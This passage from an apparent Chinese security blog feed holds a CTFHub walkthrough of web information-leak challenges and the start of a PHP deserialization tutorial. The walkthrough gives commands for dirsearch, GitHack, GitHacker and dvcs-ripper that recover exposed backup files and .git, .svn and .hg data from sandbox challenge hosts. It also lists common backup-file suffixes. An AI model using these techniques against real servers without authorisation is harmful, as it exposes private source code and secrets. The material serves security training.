alt="在这里插入图片描述"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201024125404176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现是phpinfo.php<img src="https://img-blog.csdnimg.cn/20201024125428811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>按ctrl+F搜索flag<br><img src="https://img-blog.csdnimg.cn/20201024125524903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>访问网址<br><img src="https://img-blog.csdnimg.cn/20201025171840554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用 dirsearch扫描，发现了可疑文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u http://challenge-4f306ca5f548ac6b.sandbox.ctfhub.com:<span class="number">10080</span>/ -e*</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025172527172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问该文件，自动下载了一个压缩包，解压看到flag文档，结果。。。。。。<br><img src="https://img-blog.csdnimg.cn/20201025172829492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接在浏览器上访问flag文档<br><img src="https://img-blog.csdnimg.cn/20201025173027426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p><img src="https://img-blog.csdnimg.cn/20201025173722285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一般备份文件的格式后缀为<code>.bak</code>，因此访问<code>url+/index.php.bak</code>，会自动下载一个文件，打开该文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201025173839200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> <em>常见备份文件的后缀</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.<span class="built_in">zip</span></span><br><span class="line"><span class="number">.7</span>z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br><span class="line">linux中可能以<span class="string">&quot; ~ &quot;</span> 结尾</span><br></pre></td></tr></table></figure><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>题目描述：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/20201025175348418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度了解一下什么是 <code>vim缓存</code></p><blockquote><p>vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等.<br>网页后面输入.index.php.swp才能获取到index.php的备份文件</p></blockquote><p>访问<code>url/+.index.php.swp</code>下载文件，用记事本打开，在文档底部找到flag<br><img src="https://img-blog.csdnimg.cn/20201025175508624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>题目描述：<br>DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20201118202642955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接访问<code>.DS_Store</code>文件，自动下载文件，在kali中使用命令<code>cat DS_Store</code><br><img src="https://img-blog.csdnimg.cn/20201118203036832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问d18ec35f05a6922cc5c842f7b6706243.txt文件<br><img src="https://img-blog.csdnimg.cn/20201118203317871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p><strong>安装 Git</strong></p><p>1 .点击Git-2.18.0-32-bit.exe进行安装，选择安装路径。<br><img src="https://img-blog.csdnimg.cn/20201024183656934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3doYXQ=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2 . 点击“Next”按钮<br><img src="https://img-blog.csdnimg.cn/20201024183722145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 .Next，在启动文件夹页面中，默认即可。<br><img src="https://img-blog.csdnimg.cn/20201024183744151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4 .Next，在为 Git 选择默认编辑器的页面中，可以选择一个在 Windows系统中使用较为方便的编辑器。</p><p>5 .Next，在将 Git 添加到环境变量的页面中，选择第二项。可以将 Git 自动添加到环境变量，可以方便地使用 Windows 控制台执行 Git 相关的命令。<br><img src="https://img-blog.csdnimg.cn/20201024183816454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6 .后面的页面一路next，就可以完成 Git的安装。</p><p><strong>初始化 Git</strong></p><blockquote><p>注意：在配置 Git 用户名和邮箱时，推荐使用在 CodeCode 注册的用户名和邮箱。</p></blockquote><p>1  . 在 Git 中配置 CodeCode 用户名。<br>打开cmd，输入命令。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>2 . 在 Git 中配置邮箱。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">&#x27;xxx@qq.com&#x27;</span></span><br></pre></td></tr></table></figure><p>3 . 查看已配置的用户信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --<span class="built_in">list</span></span><br></pre></td></tr></table></figure><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p> 使用githack工具处理git泄露情况，打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Githack.py http:<span class="comment">//challenge-097036b10ed011a0.sandbox.ctfhub.com:10080/.git/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024204243631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还原后的文件在 <code>dist</code> 目录下<br><img src="https://img-blog.csdnimg.cn/20201024204611326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>应该有隐藏文件夹，鼠标右键打开git命令窗口，执行<code>ls  -a</code>，发现了隐藏文件夹<code>.git</code><br><img src="https://img-blog.csdnimg.cn/20201024204803631.png#pic_center" alt="在这里插入图片描述"><br>然后<code> cd .git</code>进入.git目录,再执行<code>ls -a</code>，发现了<code>..文件</code><br><img src="https://img-blog.csdnimg.cn/2020102420502298.png#pic_center" alt="在这里插入图片描述"><br>执行<code>cd ..</code>，然后使用<code>git log</code>命令查看历史记录。最新版本 为remove flag，flag 在 add flag中<br> <img src="https://img-blog.csdnimg.cn/20201024205433523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进行比对，得到flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff <span class="number">602e0165129</span>c86054756c8a1b188265377b1d334</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024205703823.png#pic_center" alt="在这里插入图片描述"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p>打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http:<span class="comment">//challenge-5dbefbea477f1e4f.sandbox.ctfhub.com:10080/.git/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024234829723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入生成的文件夹路径后，输入： <code>git stash list</code><br><img src="https://img-blog.csdnimg.cn/2020102423493374.png#pic_center" alt="在这里插入图片描述"><br>输入 <code>git stash apply</code> 进行恢复，发现了一个文档<br><img src="https://img-blog.csdnimg.cn/20201024235041194.png#pic_center" alt="在这里插入图片描述"><br>在路径下找到文档，得到flag<br><img src="https://img-blog.csdnimg.cn/20201024235153602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>方法一：<br>和前面两题一样的操作，进入githack目录下，然后执行<code>python2 GitHack.py http://challengefbe1da739791a37e.sandbox.ctfhub.com:10080/.git/</code><br><img src="https://img-blog.csdnimg.cn/20201025122844915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>cd到生成的文件夹目录下，执行<code>git ls-files</code>命令，可以看到一个文档<br><img src="https://img-blog.csdnimg.cn/20201025122827978.png#pic_center" alt="在这里插入图片描述"><br>flag就在文档中<br><img src="https://img-blog.csdnimg.cn/20201025123137677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>kali中使用GitHacker，执行命令安装GitHacker</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clone git clone https:<span class="comment">//github.com/WangYihang/GitHacker</span></span><br></pre></td></tr></table></figure><p>进入GitHacker目录下，执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHacker.py http:<span class="comment">//challenge-78aecaffb772da05.sandbox.ctfhub.com:10080/.git</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024231829893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再GitHacker目录下会生成两个个文件夹，打开<br><img src="https://img-blog.csdnimg.cn/20201024232158129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>flag就在记事本中<br><img src="https://img-blog.csdnimg.cn/20201024232234408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>题目描述：当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。<br><img src="https://img-blog.csdnimg.cn/2020111820454290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>需要用到<code>dvcs-ripper</code>这个工具</p><p>安装dvcs-ripper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>安装依赖包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>安装失败，先执行下面的命令，再重新执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt<span class="operator">-</span><span class="keyword">get</span> <span class="keyword">update</span>  </span><br></pre></td></tr></table></figure><p>dvcs-ripper工具用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-git.pl -v -u http://challenge-bd3813f36ed0e21c.sandbox.ctfhub.com:<span class="number">10080</span>/.svn/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175105515.png" alt="在这里插入图片描述"><br>查看目录结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="operator">-</span>al</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175222664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.svn/pristine/目录，查看文件信息，看到可疑文件84<br><img src="https://img-blog.csdnimg.cn/20210127175318256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入84文件，查看文件里面的内容即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127175403327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>题目描述:当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p>使用<code>dvcs-ripper</code>工具</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="operator">/</span>rip<span class="operator">-</span>hg.pl <span class="operator">-</span>v <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-05407</span>d8a0c1ffb04.sandbox.ctfhub.com:<span class="number">10080</span><span class="operator">/</span>.hg<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175822781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.hg/store/目录，查看文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180159395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看fncache文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180229796.png" alt="在这里插入图片描述"><br>未看到flag_1711932515.txt信息<br><img src="https://img-blog.csdnimg.cn/20210127180244399.png" alt="在这里插入图片描述"><br>直接浏览器访问flag_1711932515.txt，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127180402891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（一）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="信息泄露" scheme="https://swhat.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>浅谈PHP反序列化漏洞</title>
    <link href="https://swhat.github.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-18T07:44:31.000Z</published>
    <updated>2021-02-05T05:30:15.037Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP反序列化</p> <a id="more"></a><h2 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2><blockquote><p>序列化是将变量转换为可保存或传输的字符串的过程。</p></blockquote><p>函数  <code>serialize()</code>，可将变量转换为字符串并且在转换中保存当前变量的值。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。php允许保存一个对象方便以后重用，这个过程被称为序列化。<br>我们先建一个Test对象，存入信息，然后直接输出对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line">    print_r(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Test <span class="keyword">Object</span></span><br><span class="line">(</span><br><span class="line">    [id] =&gt; <span class="number">1</span></span><br><span class="line">    [name] =&gt; admin</span><br><span class="line">    [password] =&gt; admins</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>先new一个实例$m，再用<code>serialize()</code>函数将这个对象进行序列化成字符串，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span> =<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$m</span>-&gt;id=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;name=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;password=<span class="string">&quot;roots&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$m</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;roots&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>分析一下输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>黑色箭头，字母O代表Object对象；如果是A，则代表Array数组。<br>黄色箭头，数字4，代表对象名称Test占4个字符。<br>橙色箭头，数字3，代表对象里面有3个变量。<br>红色箭头，字母s代表string类型，i代表int类型。<br>紫色箭头，数字2，代表变量名占2个字符。</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><blockquote><p>反序列化是在适当的时候把这个字符串再转化成原来的变量使用。</p></blockquote><p>函数<code>unserialize</code> ，把serialize序列化后的字符串变成一个对象。可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span> =<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$m</span>-&gt;id=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;name=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;password=<span class="string">&quot;roots&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$val</span> = serialize(<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$Nm</span>=unserialize(<span class="variable">$val</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Nm</span>-&gt;name.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Nm</span>-&gt;id;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205513840.png#pic_center" alt="在这里插入图片描述"><br><a href="https://www.w3cschool.cn/tools/index?name=unserialize">php在线反序列化工具</a><br><img src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="魔术函数"><a href="#魔术函数" class="headerlink" 